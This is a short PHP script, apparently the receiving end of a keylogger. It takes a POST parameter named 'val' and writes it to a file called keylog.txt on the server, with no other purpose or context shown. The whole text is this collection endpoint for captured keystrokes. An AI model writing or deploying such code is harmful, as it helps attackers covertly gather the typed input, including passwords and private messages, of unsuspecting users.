<?php
function write ($val)
{
    $file = "keylog.txt";
    file_put_contents($file, $val);
}
if (isset($_POST['val']))
{
    write($_POST['val']);
}
?>